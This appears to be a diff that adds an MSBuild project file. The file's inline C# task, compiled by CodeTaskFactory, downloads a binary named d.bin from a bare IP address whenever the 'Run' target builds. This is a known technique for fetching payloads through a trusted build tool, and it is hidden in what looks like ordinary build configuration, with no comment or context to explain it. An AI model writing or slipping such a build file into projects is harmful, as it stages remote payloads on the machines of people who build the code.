@@ -1,0 +1,11 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="Run"><T /></Target>
+  <UsingTask TaskName="T" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
+    <Task><Code Type="Class" Language="cs"><![CDATA[
+      using System.Net;
+      public class T : Microsoft.Build.Utilities.Task {
+        public override bool Execute() { new WebClient().DownloadFile("http://203.0.113.10/d.bin", "d.bin"); return true; }
+      }
+    ]]></Code></Task>
+  </UsingTask>
+</Project>
